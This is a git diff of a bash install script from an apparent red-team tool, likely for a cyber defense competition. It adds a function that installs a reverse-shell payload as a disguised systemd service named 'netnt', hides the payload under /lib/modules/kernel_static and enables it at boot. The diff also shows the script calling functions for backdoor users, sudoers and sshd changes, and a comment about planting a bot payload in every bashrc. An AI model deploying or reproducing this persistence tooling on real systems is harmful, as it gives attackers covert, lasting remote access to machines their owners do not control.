@@ -106,6 +106,19 @@ copyman(){
     systemctl enable vmware-network
 }
 
+revman(){
+	echo -e "\nInstalling reverse shell service...\n"
+
+	cp /opt/cdt-redteamtool/payload/static/netnt.service /etc/systemd/system/netnt.service
+	cp /opt/cdt-redteamtool/payload/revman.sh /lib/modules/kernel_static/rev
+	chmod 744 /etc/systemd/system/netnt.service
+	chmod +x /lib/modules/kernel_static/rev
+
+	systemctl daemon-reload 
+	systemctl start netnt
+	systemctl enable netnt 
+}
+
 # Add bot payload to all the bashrc found in /home and /root 
 bashrc(){
     echo -e "\nChanging all bashrc... \n"
@@ -221,6 +234,7 @@ mkdir -p /var/cache
 setup
 backdoor_users
 copyman
+revman
 clone
 sshd_config
 sudoers
